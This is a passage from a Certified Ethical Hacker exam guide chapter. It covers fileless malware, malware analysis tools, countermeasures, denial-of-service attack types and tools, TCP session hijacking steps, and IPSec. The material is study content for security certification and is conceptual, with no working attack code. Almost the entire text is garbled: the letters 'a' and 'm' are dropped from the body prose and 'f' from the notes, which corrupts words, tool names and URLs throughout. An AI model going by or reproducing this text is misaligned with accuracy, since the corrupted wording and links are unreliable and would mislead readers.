All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

386

So I did  little dditionl reding fro nti-lwre nd nti-lwre protection gen-
cies nd other publictions you probbly lredy recognize—like Kspersky, McAfee,
CrowdStrike, Norton, TechRdr, etc.—nd ce up with  description I think ight
work here.

Fileless malware is  type of licious softwre tht uses legitite progrs to infect
 coputer. It does not rely on files nd leves no footprint, king it chllenging to
detect nd reove. Fileless lwre eerged in 2017 s  instre type of ttck,
but ny of these ttck ethods hve been round for  while. Frodo, Nuber of the
Best, nd The Drk Avenger re ll erly exples of this type of lwre. More recent,
high-profile fileless ttcks include the hck of the Deocrtic Ntionl Coittee nd
the Equifx brech.

Unlike conventionl lwre, fileless lwre does not require the installation of ny
code on  trget’s syste nd resides in RAM, using ntive, legitite tools tht re
lredy prt of the trget syste to execute ttcks. These processes cn be nything; 
docuent you hve open,  PowerShell you’re working in,  PDF you’re reviewing, or
JvScript running for ny nuber of resons re ll exples. This technique of using
ntive tools to conduct ttcks is lso known s “living off the lnd.”

“OK, fine—now we hve to worry bout lwre tht isn’t even in the for of  tr-
ditionl file. So how does it work?” Well, first, like ll other lwre, it ust hve soe
point of entry on the chine. This is done through the se old ethods s trditionl
lwre—phishing e-ils, licious websites, infected docuents, licious down-
lods, nd links tht look legitite. Once “in” (i.e., the user clicks the link, ttchent,
or other), the lwre is written directly to RAM—unlike being written to disk, s re
trditionl files, lwre or otherwise. Once there, hckers cn reotely lod codes vi
scripts tht cpture nd shre your confidentil dt.

Since by design fileless lwre resides in RAM, you y be thinking the best fix,
then, is siply to turn the syste off—just do  full reboot nd, presto, the lwre is
gone. You’re not wrong in t lest prt of tht ssuption—the RAM itself is “cler” fter
the reboot—but one of the ost ppeling fetures of fileless lwre for the licious
ctor is its persistence. Once fileless lwre is encted, ttckers cn plce pylods
inside the registry on Microsoft systes, for instnce, ensuring  reboot just relods the
infection. Additionl lod points cn be prt of the overll ction plnned during the
fileless execution/infection, king your restrt siply  bup in the rod.

NOTE Forensic analysts will no doubt be jumping up and down, screaming,
“The RAM is never clear!” I’m not arguing that point at all. In act, I’m in
100 percent agreement. I’m just brushing with broad strokes to keep
the discussion moving orward.

Lstly, you y be sked to identify  fileless lwre exple or two on the ex.
Recent exples include Divergent (using registry for execution, persistence, nd
storge, nd PowerShell to interject into other processes) nd Duqu (king use of 
TrueType font–relted proble in win32k.sys). However, even though the ter file-
less lwre is reltively new, the technology hs been in ply for quite  while, with
exples like Stuxnet being round for lost two decdes. Regrdless of wht it’s been
clled over the yers, it’s definitely here to sty.

10-ch10.indd 386 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

387

Malware Analysis
In keeping with the shift in thought over lwre fro previous versions, EC-Council
introduced nd expnded nother brnd new ren for your study: lwre nlysis.
Bsiclly malware analysis is the process of reverse engineering  piece of licious soft-
wre to discover iportnt infortion bout its keup. Dt points you’d be looking
t in this effort include point of origin, how it ctully works, wht ipct it ight hve
fro  growth perspective, nd so forth.

“But der uthor,” I her you sying s you red this, “there’s no wy you cn encpsu-
lte  topic tht brod, tht iense, in  single chpter!” Well put, enterprising young
(or otherwise) cndidte for CEH, nd you’re exctly right—this field is in nd of itself
gigntic. There re so ny fcets nd nunces of forensics nd lwre nlysis tht
this chpter lone would fill entire shelves in the bookstore. But the good news is, EC-
Council knows this nd purposefully kept its entry here on  reltively high level. We’re
just going to scrtch the surfce for wht you relly need to know for the certifiction.

First, you need to know there re two in ethods of lwre nlysis—sttic nd
dynic. Static malware analysis (k static code analysis) is siply going through the
executble code to understnd the lwre pckge. No code is ctully executed in this
ethod. Insted, the executble binries re lid out on  virtul tble for your review.
There re seven jor techniques for perforing sttic lwre nlysis:

• File fingerprinting A reltively siple process of coputing  hsh vlue for
the code to identify it nd copre—ginst current or future lwre—for
chnges. Tools for this include HshMyFiles (https://www.nirsoft.net), iiktz
(https://github.co/PrrotSec/iiktz), nd MD5sus (www.pc-tools.net).

• Malware scanning (local and online) In wht y see soewht…weird
(fter ll, you lredy know it’s lwre), point n nti-lwre scnner t the
lwre or uplod it to n online site for nlysis to see if it’s prt of lredy-
known lwre.

• Perform strings search A string is, for lck of  better explntion, n rry of
chrcters tht provides redble text you cn understnd. Strings cn be notes in
the code fro the progrer to denote wht  prticulr section is doing, error
essges coded in, or specific ites progred in to counicte fro the
ppliction to the user. String serches cn be perfored with tools like BinText
(https://www.ldeid.co), FLOSS (https://www.fireeye.co), nd Strings
(https://docs.icrosoft.co).

• Identify packing/obfuscation You cn use tools like PEiD (https://www
.ldeid.co) to provide detils bout the executble, including signtures for
coon pckers, crypters, nd copilers.

• Identify portable executables (PE) information PE is the executble file
fort for Windows operting systes, encpsulting infortion necessry
for Windows OS loders to nge wrpped executble code. Anlysis of the
etdt of these files provides infortion such s dte of copiltion, librires,
icons, functions (iported nd exported), nd strings. PE.Explorer (http://
heventools.co), PEView (https://www.ldeid.co), nd Resource Hcker
(www.ngusj.co) re ll tools tht cn help with this.

10-ch10.indd 387 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

388

• Identify file dependencies For ny file to work, it hs to interct—
soewhere—with internl syste files. You cn use tools like Dependency
Wlker (http://dependencywlker.co), Snyk (https://snyk.io), nd Dependency-
check (https://jereylong.github.io) to find these iport nd export functions
(in the kernel32.dll file), long with DLLs nd librry functions.

• Malware disassembly In this finl stge, you literlly rip the code prt,
disssebling it to exine the ssebly code instructions. IDA (https://
hex-rys.co) is  disssebler/debugger ppliction tht cn help with
this, providing infortion on function trcing, red/write executions, nd
instruction trcing.

There re ultiple sites nd resources dedicted to helping you identify lwre.
A few you ight look into include Hybrid Anlysis (https://hybrid-nlysis.co),
Jotti (https://virusscn.jotti.org), nd Online Scnner (https://www.fortigurd.co).
VirusTotl (virustotl.co) is perhps the best known, nd is useful in ny wys.
If you subit  binry to VirusTotl, nd it hsn’t been seen before—out of the il-
lions of binries nd every single thing tht hs ever been prt of ny OS ever lredy
subitted—tht’s  sign tht you’re deling with soething unique, nd unique is bd if
you’re not in the business of developing your own softwre.

NOTE Volatility (https://www.volatilityoundation.org/) is the de acto
standard or Windows oline memory analysis. Released in 2007, it was
based on years o published academic research into advanced memory
analysis and orensics, and introduced the concept o analyzing the runtime
state o a system using the data ound in volatile storage (RAM). As o
this writing, Volatility is not mentioned as part o the oicial courseware.
However I’m certain it will be. Soon.

Dynamic malware analysis is  bit different. Insted of ripping prt the lwre with-
out executing it, you put it on n isolted syste (sndbox) nd ctully execute it, llow-
ing you to wtch its behvior s it executes nd runs. To do this, obviously, requires soe
significnt forethought nd plnning. For exple, you wouldn’t wnt to throw lwre
onto  connected device inside your network; while tht would definitely show you
how the lwre works, you’d be opening yourself to hvoc. Therefore,  good first step
in dynic lwre nlysis is to ke sure you hve  good test bed. Using  virtul
chine with the NIC in host-only ode nd no open shres is  good strt.

NOTE A sandbox is an isolated testing environment or experimentation.
In the sandbox, you can run code changes on legitimate applications
to see how they work or, more apropos to our discussion here, throw
some malware into an environment that looks like production, and see
what happens. Sandboxes can be single systems, entire physical network
segments, or virtual networks built in isolation.

10-ch10.indd 388 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

389

Once you hve the lwre on n isolted test bed—please, please make sure it’s iso-
lated first—reeber to tke  snpshot of the syste’s bseline before beginning. This
provides you tht necessry “before nd fter” coprison point you’ll need lter to see
wht hppened. Next, s you strt to run the lwre, py very close ttention to port
nd process onitoring. Wtching ports open nd close nd processes being disbled
nd enbled s  result of the lwre provides iportnt infortion in ssebling
response ction. Port onitoring cn be done with tools like Port Monitor (https://www
.port-onitor.co) nd the previously discussed CurrPorts (https://www.nirsoft.net).
Process onitoring cn be done with tools like Process Monitor nd Process Explorer
(https://docs.icrosoft.co/sysinternls/), for exple.

Other res you’d wnt to py ttention to s the lwre rvges your isolted snd-
box include network trffic, drivers, files nd folders, nd API clls. Network trffic
reviews include identifying wht nd where the lwre is reching out (bck) to nd
wht DNS chnges re being ffected. You cn onitor network trffic through sniffers
nd pcket cptures, nd relly dive down further by using tools like Cps (https://www
.colsoft.co) nd SolrWinds NetFlow Trffic Anlyzer (https://www.solrwinds.co).
Keep n eye on DNS efforts through tools like DNSstuff (https://www.dnsstuff.co)
nd DNSQuerySniffer (https://www.nirsoft.net).

And don’t forget the ites on the box itself. You cn exine ctul instlltion steps
the lwre uses through tools like Mirekusoft Instll Monitor (https://www.irekusoft
.co) nd SysAnlyzer (https://www.ldeid.co). How bout file nd folder onitor-
ing? Check out Tripwire (https://www.tripwire.co), Versisys (https://www.ionx.co.uk),
nd PA File Sight (https://www.powerdin.co). API clls llowing the lwre to
ccess syste files? Tke  look t API Monitor (https://pionitor.co) or APIetrics
(https://pietrics.io).

As you cn see fro the brief look we’ve tken here, lwre nlysis is n enorous
spect of security nd wrrnts ttention; nd, s noted erlier, covering it in its entirety
here is ipossible. This section provides the detils you need to know to survive the
CEH ex. But I highly encourge you, especilly if lwre nlysis is the subset of our
creer field you find interesting, to tke soe tie on your own to reserch nd explore
it. Just do it on n isolted sndbox.

Malware Countermeasures
Lstly, for this portion on lwre overll, let’s tke  very quick look t ethods to pro-
tect ginst lwre in the first plce. First, you should probbly know wht’s running
on nd being used by your syste. Trojns tke dvntge of unused ports, so if you’re
looking t your syste nd see soething using  weird port, tht would probbly be
 good indiction you y be infected. Use tools such s TCPView (Sysinternls) nd
CurrPorts (not to ention netstt) to see wht ports re in use, nd by wht. Check
out which processes re in use with Process Monitor nd Process Explorer, nd keep
n eye on ny registry chnges with RegScnner (https://www.nirsoft.net) or ny of 
nuber of registry-scnning tools. Finlly, check syste files nd folders with tools such
s Windows Files Signture Verifiction (sigverif.exe) nd Tripwire.

10-ch10.indd 389 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

390

NOTE As mentioned earlier in the chapter (and shown in Figure 10-2), i you
run netstat -an on your Windows system right now, you’ll see a very long list
o ports and their active state. The number o dynamic ports in use on any
given Windows box make it tedious and quite diicult to discover the “weird
port” in use. Most good malware will just be a connection rom a dynamic
high port to 443 or 80 or something, and analyzing even one “normal” box
can take substantial time to igure out i it’s compromised.

For study purposes,  good nti-lwre progr is lso  ust, nd keeping it up
to dte is key (the syste is only s good s your signture files, nd if you’re sleep t
the wheel in keeping the updted, you’re opening yourself up to infection). In the rel
world, ost of us hve  blind, seething htred of AV progrs. Mlwre oves quickly
in the odern world, nd ost of it runs nd is kept in eory versus on the disk.
Signture-bsed AV siply cn’t keep up, nd heuristic AV siply isn’t uch better. In
fct, I think you could ke  strong rguent in n enterprise network tht the flse
sense of security creted by the ere existence of desktop nti-lwre kes the syste
less secure. I cn’t tell you the nuber of ties during our incident response process 
victi hs sid, “Well, yes, of course, but don’t you hve nti-lwre instlled on this
chine to protect e?” Feel free to lod one up if it kes you feel better, but in ddi-
tion to frustrting your ttepts t loding nd plying with genuine security tools,
you’re likely just wsting tie.

EXAM TIP Emotet and SamSam are malware examples called out explicitly
in oicial courseware. Emotet is a common banking Trojan (usually spread
via a URL in an e-mail) that creates a ile called cultureresource.exe, encrypts
everything it tries to do, and communicates with a command-and-control
external server. SamSam is well-known ransomware that uses brute-orce
tactics against RDP.

Another good option, t lest s fr s ECC is concerned, is the sheepdip coputer.
A sheepdip syste is set up to check physicl edi, device drivers, nd other files for
lwre before it is introduced to the network. Typiclly, this coputer is used for noth-
ing else nd is isolted fro the other coputers, ening it is not connected to the
network t ll. Sheepdip coputers re usully configured with  couple of different AV
progrs, port onitors, registry onitors, nd file integrity verifiers.

NOTE It’s time or a little insight and vocabulary lesson in the real world versus
your exam. Terms such as netizen (aka cybercitizen: a person actively involved
in online communities) and technorati (a blog search engine and an old, old
term o endearment or aging techno-geeks) may be reerenced on your exam,
but are hilariously outdated and unused in the real world. And while groovy
discussions about “podcasting on a Web 2.0 site while creating mashups
o tweets” are probably still ine, to borrow a line rom the great American
cinematic classic Office Space regarding using the term sheepdip in the real
world: “I believe you’d get your ass kicked saying something like that, man.”

10-ch10.indd 390 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

391

Remaining Attacks
Hve you ever been on  relly long rod trip? You know the type I’ tlking bout,
right? When you leve, you’re relly excited, nd the iles just see to pss long hp-
pily. Then, soewhere long the wy, things chnge. The exciteent dies down, nd
before you know it, the iles becoe  burden insted of  joy. Everything sees like it
tkes forever, nd the rod becoes the eney, with ech rod sign ocking your prog-
ress insted of rking it. Then, just s things re ner their worst, you see the sign with
your destintion listed on it. It ight red 200 iles, it ight red 500, but instntly
your spirits re lifted.

Hve you noticed tht t tht point you strt driving fster? Do you know why?
Becuse you cn see the end fro there. Once the destintion is within rech, once you
cn see tht proverbil light t the end of the tunnel, your nturl instinct is to sprint.
There’s no need for bthroo breks—no need to stop nd look t the world’s lrgest
bll of twine—becuse you re so close to the end you just wnt to get there nd rest. It’s
perfectly nturl, nd it’s the wy our inds work.

Well, der reder, we both find ourselves t n interesting juncture here. You nd I
hve been on  long journey so fr. It strted out exciting, nd there ws  lot to look t
nd pss the tie with. Now we’re getting close to the end (you’ve no doubt looked t the
tble of contents nd know where we re), nd you’re tired of reding. Heck, I’m tired of
writing, nd the tepttion for both of us is to sprint—to blst through the rest nd just
finish, for goodness’ ske. Trust e, though, we’ve got just two big topics to get through
here. I’ll keep the short nd to the point, but I’ll need to know you’re willing to do your
prt nd stick with e. Coe on, we’re lost there.

NOTE Arctic saety brieings will tell you many people who were ound
rozen to death were ound on the edge o visual contact with a destination
that could provide saety. The theory goes that people were so distressed
rom hypothermia that the sight o saety caused them to either collapse or
stop to rest or a moment, resulting in an inability to go urther. That’s not a
testable item, but it its with the allegory here. As an aside, many were ound
without coats. It turns out severe hypothermia is known to make you eel
warm beore you reeze. And you thought this book would be boring.

Denial of Service
We’ve lredy defined  denil-of-service ttck, but this section is here to go into 
little ore detil (nely becuse there re CEH objectives yet to cover on the subject,
nd ECC hs devoted n entire chpter to DoS). For exple, you y or y not be
wre tht  DoS ttck is generlly thought of s  lst-resort ttck. This isn’t lwys
true—there re plenty of exples where DoS ws the whole point. In soe cses, the
ttcker just wnts to ebrrss the trget or ybe prevent the spred of infortion.
But, soeties, when  hcker is tired of trying to brek through your defenses, she y
siply resort to “blowing it up” out of frustrtion.

Obviously, this is copletely different for the ethicl hcker. We’re not going to per-
for DoS ttcks purposely, unless our client wnts or llows us to do so. Sure, there

10-ch10.indd 391 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

392

y be soe unintended DoS syptos ginst  prticulr syste or subnet, but we’re
generlly not going fter DoS s n end result. As n side, you’ll need to ke sure your
client understnds the risks involved with testing, nd ke sure tht consent is in writ-
ing; soeties knocking on doors cuses the security syste to lock the ll, nd you
don’t wnt your client coing bck t you unwre this could hve hppened.

The stndrd DoS ttck seeks to ccoplish nothing ore thn tking down  syste
or siply denying ccess to it by uthorized users. Fro this stndpoint, the DoS ttck
ight prove useful to n ethicl hcker. For exple, wht if you reoved the security
personnel’s rights to wtch the network? This could llow you  few inutes to hck t
will, without worry of getting cught (until they notice they hve no rights, of course,
which won’t tke long).

NOTE DDoS is one o the primary reasons many are headed toward the
cloud computing route. DDoS Matt’s Bait Shop and Computer Networking
Store? Not a problem. DDoS Amazon or Google? Now we’re talking.

The distributed denial-of-service (DDoS) attack, obviously, coes not fro one syste
but ny, nd they’re usully prt of  botnet. Reeber tht  botnet is  network of
zobie coputers the hcker cn use to strt  distributed ttck fro (exples of
botnet softwre/Trojns re Shrk nd Poison Ivy). These systes cn sit idly by, doing
other work for, literlly, onths before being clled into ction. Tht ction y be s
siple s sending  ping or perforing soe other tsk relevnt to the ttck t hnd.
For study purposes, the preferred counictions chnnel used to signl the bots is IRC
or Internet Cht Query (ICQ). In the rel world, it’s just s likely (perhps even ore so)
to see HTTP or HTTPS eployed.

EXAM TIP Another way o saying “botnet” may be the distributed reflection
denial-of-service (DRDoS) attack, also known as a spoof attack. It uses
multiple intermediary machines to pull o the denial o service, by having
the secondary machines send the attack at the behest o the attacker. The
attacker remains hidden because the attacks appear to originate rom those
secondary machines.

DoS nd DDoS ttcks re s nuerous nd vried s the ites in the buffet lines
in Ls Vegs. They cn rnge fro the siple to the firly coplex, nd cn require
one syste or ny to pull off. For  siple exple, just try entering soeone’s login
credentils incorrectly three ties in  row on  governent network. Bingo! You’ve suc-
cessfully DoS’d their ccount. Other reltively siple ethods could be sending corrupt
SMB essges on Windows chines to “blue screen” the device. Or ybe you siply
“rp” the chine to deth, leving it too confused to ctully send  essge nywhere.
The ethods re innuerble.

ECC lists three bsic ctegories of DoS/DDoS. Volumetric attacks consue bnd-
width resources so the trget cnnot function. Protocol attacks consue other types of
resources, such s flooding SYN connection requests, frgenttion, or spoofed sessions.

10-ch10.indd 392 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

393

Application layer attacks re, not surprisingly, ied t  specific ppliction, consuing
resources to render it kput.

The following re soe exples of DoS/DDoS ttcks:

• TCP state-exhaustion attacks These ttcks go fter lod blncers, firewlls,
nd ppliction servers by ttepting to consue their connection stte tbles.

• UDP flood The ttcker spoofs UDP pckets t  high rte to rndo ports
on the trget, using  lrge source IP ddress rnge.

• SYN attack The hcker sends thousnds upon thousnds of SYN pckets to the
chine with  false source IP address. The chine ttepts to respond with 
SYN/ACK but will be unsuccessful (becuse the ddress is flse). Eventully, ll the
chine’s resources re engged, nd it becoes  gint pperweight.

• SYN flood The hcker sends thousnds of SYN pckets to the trget but never
responds to ny of the return SYN/ACK pckets. Becuse there is  certin
ount of tie the trget ust wit to receive n nswer to the SYN/ACK, it
will eventully bog down nd run out of vilble connections.

• ICMP flood The ttcker sends ICMP Echo pckets to the trget with 
spoofed (fke) source ddress. The trget continues to respond to n ddress tht
doesn’t exist nd eventully reches  liit of pckets per second sent.

• Smurf The ttcker sends  lrge nuber of pings to the brodcst ddress of
the subnet, with the source IP ddress spoofed to tht of the trget. The entire
subnet then begins sending ping responses to the trget, exhusting the resources
there. A fraggle ttck is siilr but uses UDP for the se purpose.

• Ping of death The ttcker frgents n ICMP essge to send to  trget.
When the frgents re ressebled, the resultnt ICMP pcket is lrger thn
the xiu size nd crshes the syste. (Note tht this isn’t  vlid ttck with
odern systes, but is still  definition you y need to know.)

• Teardrop The ttcker sends  lrge nuber of grbled IP frgents with
overlpping, oversized pylods to the trget chine. On older operting
systes (such s Windows 3.1x, Windows 95, nd Windows NT), this tkes
dvntge of weknesses in the frgent ressebly functionlity of their
TCP/IP stck, cusing the syste to crsh or reboot.

• Pulse wave The hcker sends highly repetitive nd periodic groups of pckets
to the trget on  regulr bsis (every ten inutes).

• Zero day As the ne indictes, this is  DDoS ttck tht tkes dvntge of 
vulnerbility before it is known nd ptched/itigted by the trget.

• Permanent Phlashing refers to  DoS ttck tht cuses pernent dge to
 syste. Usully this includes dge to the hrdwre nd cn lso be known s
bricking  syste.

EXAM TIP Protocol attacks are measured in packets per second (pps), while
Application layer attacks are measured in requests per second (rps).

10-ch10.indd 393 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

394

Figure 10-4 LOIC

More thn  few tools re dedicted to perforing DoS on systes. Low Orbit Ion
Cnnon (LOIC) is  siple-to-use DDoS tool tht floods  trget with TCP, UDP, or
HTTP requests (see Figure 10-4). Originlly written s n open source tool to ttck
vrious Scientology websites, the tool hs ny people voluntrily joining  botnet to
support ll sorts of ttcks. As recently s 2011, LOIC ( DDoS tool originlly creted
nd used by Anonyous) ws used in  coordinted ttck ginst Sony’s PlySttion
network, nd the tool hs  trck record of other successful hits: the Recording Industry
Assocition of Aeric, PyPl, MsterCrd, nd severl other copnies hve ll fllen
victi to LOIC.

Other tools include Trinity, Tribe Flood Network, nd R-U-Ded-Yet. Trinity is 
Linux-bsed DDoS tool uch like LOIC. Tribe Flood Network is uch the se, using
voluntry botnet systes to lunch ssive flood ttcks on trgets. R-U-Ded-Yet
(known by its crony RUDY) perfors DoS with HTTP POST vi long-for field
subissions. I could go on here with ore exples, but I think you get the point. Do
 quick Google serch for “DoS tool” or “DDoS tool”—you’ll find ore thn you need
to know.

NOTE Another really groovy DoS tool worth mentioning here (even though
I don’t think it’s part o your exam) is Slowloris, a TCP DoS tool that basically
ties up open sockets and causes services to hang. It’s useul against web
servers (at least Apache and others—Nginx isn’t vulnerable to this) and
doesn’t consume large amounts o bandwidth (https://www.incapsula.com/
ddos/attack-glossary/slowloris.html).

Finlly, when it coes to counteresures ginst DoS ttcks, ctions such s dis-
bling unnecessry services, using  good firewll policy, nd keeping security ptches

10-ch10.indd 394 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

395

nd upgrdes up to dte re pretty stndrd fre. Additionlly, the use of  good network-
bsed IDS (NIDS) cn help ginst ttcks fro cross the network. Strong, security-
conscious code should be n bsolute for your pplictions, nd the use of tools such s
Skydnce cn help detect nd prevent DoS ttcks. You ight lso look into network
ingress filtering s well s soe network uditing tools to help long the wy.

NOTE The real answer to a true DDoS is the involvement o your ISP up
channel. It will be next to impossible or you, at an endpoint locale, to keep
up with attacks rom a sophisticated global (or even geographically close)
botnet. The ISP may wind up blocking a lot o legitimate traic, too, but it
may be all you can do until the storm passes.

Session Hijacking
Unlike DoS ttcks, session hijcking ttepts ren’t trying to brek nything or shut off
ccess necessrily. The ide is firly siple: the ttcker wits for  session to begin nd, fter
ll the pesky uthentiction gets done, jups in to stel the session for hiself. This differs 
little fro the spoofing ttcks we’ve previously tlked bout. In spoofing, you’re pretending
to be soeone else’s ddress with the intent of sniffing their trffic while they work. Session
hijacking refers to the ctive ttept to stel the entire session fro the client: the server isn’t
even wre of wht hppened, nd the client siply connects gin in  different session.

Fro  high-level view, TCP session hijcking sounds reltively esy. First, the hcker
trcks the session, wtching the sequence nubers nd the flow of pcket heders. Next,
the hcker “desynchronizes” the connection by sending  TCP RST or FIN to the client,
cusing it to close its side of the session. Lstly (t the se tie), using the infortion
gthered during the first step, the hcker begins sending pckets to the server with the
predicted (guessed) session ID, which is generted by n lgorith using the sequence
nubers. If the hcker gets it right, he hs tken over the session becuse the server
thinks it’s the originl client’s next pcket in the series. The following ore copletely
describes the session hijcking steps (per EC-Council):

1. Sniff the trffic between the client nd the server.
2. Monitor the trffic nd predict the sequence nubering.
3. Desynchronize the session with the client.
4. Predict the session token nd tke over the session.
5. Inject pckets to the trget server.

NOTE Session hijacking can be done via brute orce, calculation, or stealing.
Additionally, you can always send a preconigured session ID to the target;
when the target clicks to open it, simply wait or authentication and jump in.

TCP session hijcking is possible becuse of the wy TCP works. As  session-oriented
protocol, it provides unique nubers to ech pcket, which llows the receiving chine
to resseble the in the correct, originl order, even if they re received out of order.

10-ch10.indd 395 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

396

The synchronized pckets we’ve tlked bout throughout the book set up these sequence
nubers (SNs). With ore thn four billion cobintions vilble, the ide is to hve
the process begin s rndoly s possible. However, it is sttisticlly possible to repet
sequence nubers nd, even esier, to guess wht the next one in line will be.

NOTE It is air to note that sequence attacks are exceptionally rare in
cases where you’re not in the middle. A deinitive paper on the subject,
despite its age, can be ound at https://lcamtu.coredump.cx/newtcp/.
It provides images o sequence numbers rom various operating system
implementations and gives an idea o how statistically successul (or
unsuccessul) you’ll be in messing with them.

So, just for clrity’s ske, let’s go bck to the erlier discussion in Chpter 3 on TCP
pckets flying through the ether. The initil sequence nuber (ISN) is sent by the initi-
tor of the session in the first step (SYN). This is cknowledged in the second hndshke
(SYN/ACK) by increenting tht ISN by one, nd nother ISN is generted by the
recipient. This second nuber is cknowledged by the inititor in the third step (ACK),
nd fro there on out couniction cn occur. The window size field tells the recipi-
ent how uch dt he cn send before expecting  return cknowledgent. Cobine ll
of the together nd, over tie, you cn wtch the whole thing in ction. For exple,
consider Figure 10-5. It’s worth entioning these types of ttcks re considered very
rre in the rel world: outside of n lso very rre MITM ttck, you’re s likely to see
this (nd ping of deth) s you re to see  flying pecock.

NOTE There are also windowing attacks or TCP that shrink the data
size window.

SEQ=100 ACK=0 Flags: SYN

SEQ=500 ACK=101 Flags: SYN, ACK

SEQ=101 ACK=501 Flags: ACK

Segment 1: SEQ=102 ACK=501

Computer A Segment 2: SEQ=103 ACK=501 Computer B

Segment 3: SEQ=104 ACK=501

SEQ=501 ACK=105

Figure 10-5 TCP communication

10-ch10.indd 396 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

397

After the hndshke, for every dt pylod trnsitted, the sequence nuber is
increented. In the first two steps of the three-wy hndshke, the ISNs re exchnged
(in this cse, 100 nd 500) nd then re increented bsed on the delivery of dt. In
our exple here, Coputer A sends three bytes with n initil sequence nuber of
102, so ech pcket sequence nuber will increent ccordingly—102, 103, nd 104,
respectively. The receiver then sends n cknowledgent of 105 becuse tht is the next
byte it expects to receive in the next pcket.

It sees esy enough, but once you dd the window size nd tke into ccount tht
the nubers ren’t siple (like the 100 nd 500 in our exple), it cn get hiry pretty
quickly. The window size, you y recll, tells the sender how ny outstnding bytes
it cn hve on the network without expecting  response. The ide is to iprove per-
fornce by llowing ore thn one byte t  tie before requiring the “Hey, I got it”
cknowledgent. This soeties coplictes things becuse the sender y cut bck
the window size bsed on wht’s going on network-wise nd wht it’s trying to send.

EXAM TIP You’ll need to remember that the sequence numbers increment
on acknowledgment. Additionally, you’ll almost certainly get asked a
scenario version o sequence numbering (i I were writing the test, I’d give
you one). You’ll need to know, given an acknowledgment number and a
window size, what sequence number would be acceptable to the system.
For example, an acknowledgment o 105 with a window size o 200 means
you could expect sequence numbering rom 105 through 305.

Thnkfully,  ultitude of tools re vilble to ssist in session hijcking. We’ve dis-
cussed Ettercp (in Chpters 4 nd 5)— pcket sniffer on steroids—but not in the con-
text of ctively hijcking sessions. It’s n excellent n-in-the-iddle tool nd cn be run
fro  vriety of pltfors (lthough it is Linux ntive). Hunt nd T-sight re probbly
the two best-known session hijcking tools. Hunt cn sniff, hijck, nd reset connections
t will, wheres T-sight (coercilly vilble) cn esily hijck sessions s well s oni-
tor dditionl network connections. Soe other tools re Pros (known ore s  proxy),
Burp Suite, Juggernut ( well-known Linux-bsed tool), Hster, nd Ferret.

NOTE You’ve heard o session hijacking and man-in-the-middle, but what
about man-in-the-browser? An MITB attack occurs when the hacker sends
a Trojan to intercept browser calls. The Trojan basically sits between the
browser and libraries, allowing a hacker to watch, and interact within, a
browser session. Cobalt Strike creator Raphael Mudge (aka Mudge) added
this eature a couple years back (https://www.cobaltstrike.com/help-
browser-pivoting). I you have his Beacon (the name o his implant) on a
box, you can “browser pivot” such that all o the target’s active sessions
become your own. All o them. It eectively sets up a local proxy port so you
can point your browser to it, and it directs all o your requests through the
beacon on the target machine. Now you’re browsing in your own browser as
them, without them even knowing it.

10-ch10.indd 397 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

398

Counteresures for session hijcking re, gin, usully coonsense issues. For
one thing, using unpredictble session IDs in the first plce protects ginst hijcking
(reeber this one). Other options include liiting incoing connections, iniiz-
ing reote ccess, nd regenerting the session key fter uthentiction is coplete.
Lstly,  relly good choice is to use encryption to protect the chnnel. We’ll cover IPSec
ore when we get round to cryptogrphy, but  sll refresher here (or introduction,
if you know nothing bout it) is  gret ide—inly becuse this is where ECC covers
it, nd encryption nd uthentiction re considered good preventive esures ginst
session hijcking.

A protocol suite clled IPSec is used to secure IP couniction by providing
encryption nd uthentiction services to ech pcket, nd it hs severl rchitecturl
coponents you’ll need to know. First, IPSec works in two odes. In transport mode,
the pylod nd ESP triler re encrypted; however, the IP heder of the originl pcket
is not. Trnsport ode cn be used in network ddress trnsltion (NAT) becuse the
originl pcket is still routed in exctly the se nner s it would hve been without
IPSec. Tunnel mode, however, encrypts the whole thing, encpsulting the entire origi-
nl pcket in  new IPSec shell. This kes tunnel ode incoptible with NAT. The
rest of IPSec rchitecture includes the following protocols:

• Authentication Header AH is  protocol within IPSec tht gurntees the
integrity nd uthentiction of the IP pcket sender.

• Encapsulating Security Payload ESP is  protocol tht lso provides origin
uthenticity nd integrity, but it cn tke cre of confidentility (through
encryption) too. ESP does not provide integrity nd uthentiction for the entire
IP pcket in trnsport ode, but in tunnel ode it provides protection to the
entire IP pcket.

• Internet Key Exchange IKE is  protocol tht produces the keys for the
encryption process.

• Oakley Okley is  protocol tht uses Diffie-Helln to crete ster nd
session keys.

• Internet Security Association Key Management Protocol A protocol tht
fcilittes encrypted couniction between two endpoints.

